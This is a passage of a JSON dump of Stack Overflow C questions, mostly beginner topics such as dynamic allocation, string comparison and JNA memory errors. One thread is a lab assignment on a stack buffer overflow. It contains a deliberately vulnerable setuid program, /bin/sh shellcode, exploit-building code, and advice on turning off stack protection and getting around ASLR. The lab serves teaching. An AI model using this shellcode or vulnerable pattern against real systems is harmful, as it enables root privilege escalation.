simpler. One solution could be to allocate 500 chars and when this amount is used you reallocate more memory or your write that and reuse same memory. It&#39;s up to you."}, {"owner": {"reputation": 1285, "user_id": 5003848, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/12b681a7a5cab103fa1ea1165685555b?s=128&d=identicon&r=PG&f=1", "display_name": "tonysdg", "link": "https://stackoverflow.com/users/5003848/tonysdg"}, "reply_to_user": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 0, "creation_date": 1447225788, "post_id": 33645322, "comment_id": 55064889, "body": "@TheParamagneticCroissant: That was actually my edit on the original question...it was my attempt to sum up the original message of the question, which included &quot;how can I use &#39;dynamic allocation of memory&#39;&quot;.  I assumed at that point the OP wasn&#39;t sure what it was in the first place."}], "owner": {"reputation": 39, "user_id": 5517410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/abae6b2827f44812c0ba8df49e8a2da0?s=128&d=identicon&r=PG&f=1", "display_name": "user5517410", "link": "https://stackoverflow.com/users/5517410/user5517410"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 31, "favorite_count": 0, "closed_date": 1447223586, "answer_count": 0, "score": 0, "last_activity_date": 1447223260, "creation_date": 1447223260, "question_id": 33645322, "link": "https://stackoverflow.com/questions/33645322/how-can-i-read-a-paragraph-as-a-single-string-in-c", "closed_reason": "Duplicate", "title": "How can I read a paragraph as a single string in C?", "body": "<p>I'm writing a C program that should read in an essay from a user.  The essay is divided into multiple paragraphs.\nI don't know how many lines or characters the essay will be, but I do know that it ends with a hash symbol (<code>#</code>).  I want to use only as much memory as is necessary to hold the essay.</p>\n\n<p>Here is what I have tried so far:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nmain(){\n\n    int size;\n    char *essay;\n\n    printf(\"\\n how many characters?\\n\");\n    scanf(\"%d\", &amp;size);\n    essay =(char *) malloc(size+1);\n    printf(\"Type the string\\n\");\n    scanf(\"%s\",essay);\n\n    printf(\"%s\",essay );\n\n}\n</code></pre>\n\n<p>As I said before, I don't know (and don't want to ask) about the number of characters beforehand.  How do I dynamically allocate memory to save space? (What is dynamic memory allocation?) Is there another way to save memory that doesn't rely on dynamic allocation?</p>\n\n<p>Additionally, my code only reads one line at a time right now.  How can I read multiple lines and store them as a single string?</p>\n\n<p>this is another code</p>\n\n<pre><code> #include&lt;stdio.h&gt;\n\nmain() {\n   char essay[100];\n\n   printf(\"Type the essay:\\n\");\n   scanf(\"%[^#]s\",  essay);\n\n   printf(\"the essay : \\n%s\", essay);\n\n\n}\n</code></pre>\n\n<p>it is working but it is wrong specify the number of characters   </p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 2, "creation_date": 1447222491, "post_id": 33645042, "comment_id": 55063832, "body": "<i>This code have some errors</i> has zero meaning unless you also include what <i>errors</i> you&#39;re getting. There is no reason you should not provide it in your question - it&#39;s on your screen right in front of you."}], "answers": [{"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 1, "last_activity_date": 1447222258, "creation_date": 1447222258, "answer_id": 33645163, "question_id": 33645042, "link": "https://stackoverflow.com/questions/33645042/should-i-declare-array-size-for-int/33645163#33645163", "title": "Should I declare array size for int?", "body": "<blockquote>\n  <p>I think declare i for double is problem.</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<p>You compiler should report the error that you are using a <code>double</code> as an index in an array. Using gcc, I get the following error.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>soc.c:9:12: error: array subscript is not an integer\n       array[i][0] = i;\n\nsoc.c:10:12: error: array subscript is not an integer\n       array[i][1] = i*i;\n            ^\nsoc.c:11:12: error: array subscript is not an integer\n       array[i][2] = i*i*i;\n         ^\n</code></pre>\n\n<blockquote>\n  <p>Should I using I for int?</p>\n</blockquote>\n\n<p>Yes.</p>\n"}], "owner": {"reputation": 35, "user_id": 5432196, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86807035536fea76a82937fed2f60cda?s=128&d=identicon&r=PG&f=1", "display_name": "orangetimes", "link": "https://stackoverflow.com/users/5432196/orangetimes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "closed_date": 1447230576, "accepted_answer_id": 33645163, "answer_count": 1, "score": -3, "last_activity_date": 1447222258, "creation_date": 1447221606, "question_id": 33645042, "link": "https://stackoverflow.com/questions/33645042/should-i-declare-array-size-for-int", "closed_reason": "Not suitable for this site", "title": "Should I declare array size for int?", "body": "<p>I'm beginner of C programming and using visual stdio 2015.</p>\n\n<p>For example,</p>\n\n<pre><code>double i = 0;\ndouble array[10][3];\nfor (i = 0; i &lt; 10; i++)\n{\n    array[i][0] = i;\n    array[i][1] = i*i;\n    array[[i][2] = i*i*i;\n}\n</code></pre>\n\n<p>This code have some errors. I think declare i for double is problem. Should I using I for int?</p>\n"}, {"tags": ["c", "if-statement"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1447221682, "post_id": 33645039, "comment_id": 55063626, "body": "Change this <code>if(userName == adminName)</code> <b>-&gt;</b> <code>if(strcmp(userName,adminName)==0)</code>."}, {"owner": {"reputation": 5290, "user_id": 4029561, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/1Wcx1.jpg?s=128&g=1", "display_name": "NSNoob", "link": "https://stackoverflow.com/users/4029561/nsnoob"}, "edited": false, "score": 0, "creation_date": 1447221822, "post_id": 33645039, "comment_id": 55063668, "body": "Because you are comparing strings. That&#39;s not how comparing strings works. That&#39;s not how any of it works!"}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user4371190"}, "is_accepted": false, "score": 0, "last_activity_date": 1447223532, "last_edit_date": 1447223532, "creation_date": 1447222754, "answer_id": 33645234, "question_id": 33645039, "link": "https://stackoverflow.com/questions/33645039/could-someone-tell-me-why-isnt-my-if-else-statment-working/33645234#33645234", "title": "Could someone tell me why isn&#39;t my if/else statment working?", "body": "<p>In your question there are a lot of mistake.\nFirst of all </p>\n\n<pre><code>adminName[20] =\"admin\";\n</code></pre>\n\n<p>will throw an warning, and your admin array is not made \"admin\", while the 20th element which doesn't even exists, as u have max of adminName[19].</p>\n\n<p>You can't directly copy a string to another array, use this for string copy</p>\n\n<pre><code>strcpy();\n</code></pre>\n\n<p>And for comparison, use</p>\n\n<pre><code>strcmp();\n</code></pre>\n\n<p>And better learn string.h header files. Those two are present in string.h header file</p>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 5549411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/94a81d7b4ff8a68a08f00d092a7a8bea?s=128&d=identicon&r=PG&f=1", "display_name": "YasirAnqa", "link": "https://stackoverflow.com/users/5549411/yasiranqa"}, "edited": false, "score": 0, "creation_date": 1447223961, "post_id": 33645332, "comment_id": 55064256, "body": "Thank you, I was wondering how to use strcpy() :)"}, {"owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "reply_to_user": {"reputation": 3, "user_id": 5549411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/94a81d7b4ff8a68a08f00d092a7a8bea?s=128&d=identicon&r=PG&f=1", "display_name": "YasirAnqa", "link": "https://stackoverflow.com/users/5549411/yasiranqa"}, "edited": false, "score": 0, "creation_date": 1447224230, "post_id": 33645332, "comment_id": 55064353, "body": "Also 20 chars for the names seems a bit short, you could decide to expand to 30."}], "tags": [], "owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "is_accepted": true, "score": 0, "last_activity_date": 1447223330, "creation_date": 1447223330, "answer_id": 33645332, "question_id": 33645039, "link": "https://stackoverflow.com/questions/33645039/could-someone-tell-me-why-isnt-my-if-else-statment-working/33645332#33645332", "title": "Could someone tell me why isn&#39;t my if/else statment working?", "body": "<p>Please try this, it works as you wanted, read notes in the code, it is normal to make a few mistakes while learning.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(  )\n{\n  char adminName[20];\n  char userName[20];\n\n  strcpy( adminName, \"Admin\" ); // use strcpy\n\n  printf( \"Please, enter your name:\" );\n  scanf( \"%s\", userName );\n\n  if ( !strcmp( userName, adminName ) ) // use strcmp\n  {\n    printf( \"Welcome, Admin! \\n\" );\n  }\n  else              // use else\n    printf( \"Wrong log-in details, %s. \\n\", userName );\n\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5549411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/94a81d7b4ff8a68a08f00d092a7a8bea?s=128&d=identicon&r=PG&f=1", "display_name": "YasirAnqa", "link": "https://stackoverflow.com/users/5549411/yasiranqa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "closed_date": 1447224079, "accepted_answer_id": 33645332, "answer_count": 2, "score": -3, "last_activity_date": 1447223532, "creation_date": 1447221578, "question_id": 33645039, "link": "https://stackoverflow.com/questions/33645039/could-someone-tell-me-why-isnt-my-if-else-statment-working", "closed_reason": "Duplicate", "title": "Could someone tell me why isn&#39;t my if/else statment working?", "body": "<p>I've tried to play with little details, and yet, doesn't seem to work properly. And I don't know why!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    char adminName[20];\n    char userName[20];\n    adminName[20]= \"Admin\";\n\n    printf(\"Please, enter your name:\");\n    scanf(\"%s\", userName);\n\n    if(userName == adminName) {\n        printf(\"Welcome, Admin! \\n\");\n    }\n\n    printf(\"Wrong log-in details, %s. \\n\", userName);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "codeblocks", "precompile"], "answers": [{"tags": [], "owner": {"reputation": 162, "user_id": 5050492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93dd6b8e33cc6b97c9b32f49dfafbb8c?s=128&d=identicon&r=PG&f=1", "display_name": "Kev Bo", "link": "https://stackoverflow.com/users/5050492/kev-bo"}, "is_accepted": true, "score": 2, "last_activity_date": 1447220840, "creation_date": 1447220840, "answer_id": 33644924, "question_id": 33644737, "link": "https://stackoverflow.com/questions/33644737/how-to-get-the-pre-compiled-source-code-in-codeblocks/33644924#33644924", "title": "How to get the Pre-compiled source code in codeblocks?", "body": "<p>If you use the <a href=\"https://gcc.gnu.org/onlinedocs/gcc-4.4.0/gcc/Preprocessor-Options.html#Preprocessor-Options\" rel=\"nofollow\">-E</a> option of gcc, you can expand the macros to a C file, and then compile the C file.</p>\n"}], "owner": {"reputation": 1088, "user_id": 4600588, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5281e25d0860b6bb36a0841bce6ee8c0?s=128&d=identicon&r=PG", "display_name": "DaSqy Stc", "link": "https://stackoverflow.com/users/4600588/dasqy-stc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 33644924, "answer_count": 1, "score": 1, "last_activity_date": 1447220840, "creation_date": 1447219535, "question_id": 33644737, "link": "https://stackoverflow.com/questions/33644737/how-to-get-the-pre-compiled-source-code-in-codeblocks", "title": "How to get the Pre-compiled source code in codeblocks?", "body": "<p>There are some <code>#define</code> statements in my C language code, and now i find some bug.\nBut the codeblocks IDE can not step into the #define block.</p>\n\n<p>so i want to get the  Pre-compiled source code, which will expand the <code>#define</code> macro.</p>\n"}, {"tags": ["java", "c", "exception", "native", "jna"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4371190"}, "edited": false, "score": 0, "creation_date": 1447219197, "post_id": 33644686, "comment_id": 55063071, "body": "can u tell me where is C in it."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4371190"}, "edited": false, "score": 0, "creation_date": 1447219570, "post_id": 33644686, "comment_id": 55063168, "body": "i dont know about garbage collection in java. But u should free the memory of r object in there in the main function."}, {"owner": {"reputation": 3529, "user_id": 2625772, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/0QjpB.jpg?s=128&g=1", "display_name": "AnOldSoul", "link": "https://stackoverflow.com/users/2625772/anoldsoul"}, "edited": false, "score": 0, "creation_date": 1447219737, "post_id": 33644686, "comment_id": 55063204, "body": "In java garbage collection is done automatically. But I did try forcing a manual garbage collection using System.gc() method. But still the exception keeps coming."}, {"owner": {"reputation": 3529, "user_id": 2625772, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/0QjpB.jpg?s=128&g=1", "display_name": "AnOldSoul", "link": "https://stackoverflow.com/users/2625772/anoldsoul"}, "edited": false, "score": 0, "creation_date": 1447227546, "post_id": 33644686, "comment_id": 55065587, "body": "@KishanKumar I have edited the question. Please read the last paragraph. Do you get any idea? :("}, {"owner": {"user_type": "does_not_exist", "display_name": "user4371190"}, "edited": false, "score": 0, "creation_date": 1447228271, "post_id": 33644686, "comment_id": 55065884, "body": "i think it is trying to allocate the new object over the old memory, which is causing the problem."}], "owner": {"reputation": 3529, "user_id": 2625772, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/0QjpB.jpg?s=128&g=1", "display_name": "AnOldSoul", "link": "https://stackoverflow.com/users/2625772/anoldsoul"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 805, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1447227519, "creation_date": 1447219098, "last_edit_date": 1447227519, "question_id": 33644686, "link": "https://stackoverflow.com/questions/33644686/why-is-invalid-memory-access-exception-thrown-occasionally", "title": "Why is Invalid memory access exception thrown occasionally?", "body": "<p>I have the a JNA structure which is throwing InvalidMemoryAccessException occasionally. Without changing the code,when I run it, it runs at times. At times it throw the exception as shown below. </p>\n\n<pre><code>Exception in thread \"main\" java.lang.Error: Invalid memory access\nat com.sun.jna.Native.getInt(Native Method)\nat com.sun.jna.Pointer.getInt(Pointer.java:602)\nat com.sun.jna.Pointer.getValue(Pointer.java:390)\nat com.sun.jna.Structure.readField(Structure.java:653)\nat com.sun.jna.Structure.read(Structure.java:521)\nat com.sun.jna.Structure.autoRead(Structure.java:1882)\nat com.sun.jna.Structure.conditionalAutoRead(Structure.java:491)\nat com.sun.jna.Function.invoke(Function.java:418)\n</code></pre>\n\n<p>Shown below is my structure in C.</p>\n\n<pre><code> RFIDLIB_API ipj_error start(\n    ipj_iri_device* iri_device       /*[in]*/,\n    ipj_action      action           /*[in]*/);\n\n typedef uint32_t ipj_action;\n</code></pre>\n\n<p>Below is my Java implementation.</p>\n\n<pre><code>public class ipj_action extends Structure {\n\npublic int ipj_action_value;\n\npublic ipj_action() {\n    setAlignType(Structure.ALIGN_NONE);\n    allocateMemory();\n    read();\n}\n\n@Override\nprotected List getFieldOrder() {\n    return Arrays.asList(\"ipj_action_value\");\n\n}\n\n}\n</code></pre>\n\n<p>Below is the main class from where I call it.</p>\n\n<pre><code>public class RFIDMain {\n\npublic  rfidlib rlib;\npublic  ipj_iri_device ipj_iri_device;\npublic  ipj_action ipj_action;\npublic  ipj_error errorStatus;\n\npublic static void main(String[] args) {\n\n    RFIDMain r = new RFIDMain();\n\n\n    r.rlib = (rfidlib) Native.loadLibrary(\"rfidlib\", rfidlib.class);\n    r.ipj_iri_device = new ipj_iri_device();\n    r.ipj_action = new ipj_action();\n    r.errorStatus = new ipj_error();\n    r.ipj_action.ipj_action_value = 0x1;\n\n    r.errorStatus = r.rlib.start(r.ipj_iri_device, r.ipj_action);\n\n    System.out.println(r.errorStatus);\n}\n\n}\n</code></pre>\n\n<p>The exception is not thrown when I make any modification to the line \"r.ipj_action.ipj_action_value=0x01\". Like if I remove it and run it, it runs. If I put it after removing and run again it runs. If I keep it as it is and run it throws the exception. Like if I keep the code without that line and run twice, the exception is thrown. Similarly if I keep the code with that line and run twice again the exception is throw. Is this some problem with the memory allocation for the structure? Please advice.</p>\n"}, {"tags": ["c", "security", "buffer-overflow"], "comments": [{"owner": {"reputation": 462, "user_id": 5371616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56d0290bd8ddb4c07cb7bd5c4747bdc4?s=128&d=identicon&r=PG&f=1", "display_name": "cm161", "link": "https://stackoverflow.com/users/5371616/cm161"}, "edited": false, "score": 0, "creation_date": 1447224289, "post_id": 33644572, "comment_id": 55064370, "body": "You are using fwrite() and fread(), hence, you should use fopen() to open files in binary mode - &#39;wb&#39; and &#39;rb&#39; respectively. Otherwise, use fprintf() and fscanf() for text mode (non-binary mode) for files."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1447250110, "post_id": 33644572, "comment_id": 55077295, "body": "Please format your code."}], "answers": [{"tags": [], "owner": {"reputation": 321, "user_id": 4446356, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5fUXH.jpg?s=128&g=1", "display_name": "bananaappletw", "link": "https://stackoverflow.com/users/4446356/bananaappletw"}, "is_accepted": false, "score": -1, "last_activity_date": 1447229726, "creation_date": 1447229726, "answer_id": 33646544, "question_id": 33644572, "link": "https://stackoverflow.com/questions/33644572/buffer-vulnerability-problems-generate-shell/33646544#33646544", "title": "Buffer Vulnerability Problems - Generate Shell", "body": "<p>I just point out some important thing about this lab assignment.</p>\n\n<p>First, You have to know what vulnerability you used.</p>\n\n<p>shellcode</p>\n\n<pre><code>strcpy(&amp;buffer[486], shellcode);\nlong *ptr = (long *)(buffer+36);\n*ptr = &amp;shellcode;\nbuffer[sizeof(buffer)-1] = '\\0';\n</code></pre>\n\n<p>In this code you want to change the return address of your shellcode\nBut the shellcode address is on the stack, the return address you fill in here is the address of global variable called \"shellcode\", not actually the address on the stack.</p>\n\n<p>And If you want to return to your shellcode, you have to disable the NX bit.\nBecause the shellcode address is on the stack, the stack memory areas is non-executable.</p>\n\n<p>More information about NX bit you could find here: <a href=\"https://en.wikipedia.org/wiki/NX_bit\" rel=\"nofollow\">https://en.wikipedia.org/wiki/NX_bit</a></p>\n\n<p>You have to compile your stack.c with following options</p>\n\n<pre><code>gcc -o stack -fno-stack-protector -z execstack stack.c\n</code></pre>\n\n<p>You could check your program protection with this tool called checksec.\nSorry me reputation is too low to post more than 2 links.\nPlease goolgle checksec.\nAnd you have to conquer ASLR protection.\nOne way is to set the shellcode to the global variable in stack.c.\nAnd the address of global variable is fixed.</p>\n\n<p>More information about ASLR you could find here: <a href=\"https://en.wikipedia.org/wiki/Address_space_layout_randomization\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a></p>\n\n<p>If you still stuck in it, welcome to ask me.</p>\n"}], "owner": {"reputation": 9, "user_id": 5549285, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/178868e9c919e6c9bae9643ff289007c?s=128&d=identicon&r=PG&f=1", "display_name": "larjon", "link": "https://stackoverflow.com/users/5549285/larjon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 358, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1447229726, "creation_date": 1447218279, "question_id": 33644572, "link": "https://stackoverflow.com/questions/33644572/buffer-vulnerability-problems-generate-shell", "title": "Buffer Vulnerability Problems - Generate Shell", "body": "<p>I have a lab assignment that I am stuck on. I have to take advantage of a buffer overflow to generate a shell that has root privileges. There's two separate C files: stack.c</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint bof(char *str)\n {\nchar buffer[24];\nstrcpy(buffer,str);\nreturn 1;\n}\n\nint main(int argc, char* argv[])\n{\nchar str[517];\n\nFILE *badfile;\nbadfile = fopen(\"badfile\",\"r\");\n\nfread(str, sizeof(char),517, badfile);\nbof(str);\n\nprintf(\"Returned Properly\\n\");\nreturn 1;\n}\n</code></pre>\n\n<p>and exploit.c:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nchar shellcode[]=\n\"\\x31\\xc0\"              /* xorl    %eax,%eax              */\n\"\\x50\"                  /* pushl   %eax                   */\n\"\\x68\"\"//sh\"            /* pushl   $0x68732f2f            */\n\"\\x68\"\"/bin\"            /* pushl   $0x6e69622f            */\n\"\\x89\\xe3\"              /* movl    %esp,%ebx              */\n\"\\x50\"                  /* pushl   %eax                   */\n\"\\x53\"                  /* pushl   %ebx                   */\n\"\\x89\\xe1\"              /* movl    %esp,%ecx              */\n\"\\x99\"                  /* cdql                           */\n\"\\xb0\\x0b\"              /* movb    $0x0b,%al              */    \n\"\\xcd\\x80\"              /* int     $0x80                  */\n;\nvoid main(int argc, char **argv)\n{\nchar buffer[517];\nFILE *badfile;\n/* Initialize buffer with 0x90 (NOP instruction) */\nmemset(&amp;buffer, 0x90, 517);\n/* You need to fill the buffer with appropriate contents here */\n/* Save the contents to the file \"badfile\" */\nbadfile = fopen(\"./badfile\", \"w\");\nfwrite(buffer, 517, 1, badfile);\nfclose(badfile);\n}\n</code></pre>\n\n<p>I can only edit exploit.c. Here's the edits I have made:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nchar shellcode[]=\n\"\\x31\\xc0\"              /* xorl    %eax,%eax              */\n\"\\x50\"                  /* pushl   %eax                   */\n\"\\x68\"\"//sh\"            /* pushl   $0x68732f2f            */\n\"\\x68\"\"/bin\"            /* pushl   $0x6e69622f            */\n\"\\x89\\xe3\"              /* movl    %esp,%ebx              */\n\"\\x50\"                  /* pushl   %eax                   */\n\"\\x53\"                  /* pushl   %ebx                   */\n\"\\x89\\xe1\"              /* movl    %esp,%ecx              */\n\"\\x99\"                  /* cdql                           */\n\"\\xb0\\x0b\"              /* movb    $0x0b,%al              */    \n\"\\xcd\\x80\"              /* int     $0x80                  */\n;\nvoid main(int argc, char **argv)\n{\nchar buffer[517];\nFILE *badfile;\n/* Initialize buffer with 0x90 (NOP instruction) */\nmemset(&amp;buffer, 0x90, 517);\n/* You need to fill the buffer with appropriate contents here */\nstrcpy(&amp;buffer[486], shellcode);\nlong *ptr = (long *)(buffer+36);\n*ptr = &amp;shellcode;\nbuffer[sizeof(buffer)-1] = '\\0';\n/* Save the contents to the file \"badfile\" */\nbadfile = fopen(\"./badfile\", \"w\");\nfwrite(buffer, 517, 1, badfile);\nfclose(badfile);\n}\n</code></pre>\n\n<p>The commands I use to implement this are:</p>\n\n<pre><code>$ su root\n$ Password (enter root password)\n# gcc -o stack -fno-stack-protector stack.c\n# chmod 4755 stack\n# exit\n$ gcc -o exploit exploit.c\n$./exploit\n$./stack\n</code></pre>\n\n<p>This should replace the return address to be one with the shell when I call stack. Exploit compiles and runs just fine, but when I get to stack, it does a segmentation fault. I know it reads in the file and assigns all the values, but I don't know why it doesn't get redirected to the shellcode when it hits that address. Does anyone know why it might not be generating the shell?</p>\n"}, {"tags": ["c", "linux"], "answers": [{"tags": [], "owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "is_accepted": false, "score": 1, "last_activity_date": 1447218535, "creation_date": 1447218535, "answer_id": 33644603, "question_id": 33644558, "link": "https://stackoverflow.com/questions/33644558/anonymous-mapping-or-file-mapping/33644603#33644603", "title": "anonymous mapping or file mapping?", "body": "<p>Look at <code>/proc/self/maps</code>.  It should tell you all you want about all regions.</p>\n"}], "owner": {"reputation": 1438, "user_id": 5345612, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/80f66466ea864a27bc88dd3bf614f8c4?s=128&d=identicon&r=PG&f=1", "display_name": "HuangJie", "link": "https://stackoverflow.com/users/5345612/huangjie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1447218535, "creation_date": 1447218176, "question_id": 33644558, "link": "https://stackoverflow.com/questions/33644558/anonymous-mapping-or-file-mapping", "title": "anonymous mapping or file mapping?", "body": "<p>We can know whether a VMA (virtual memory area) exists in a particular region using <code>madvise</code>, if the return value is <code>-1</code> and <code>errno==ENOMEM</code>, then there is no VMA lying. Now I want to know that place is an annoymouns mapping or a file mapping, how can I do it?</p>\n"}]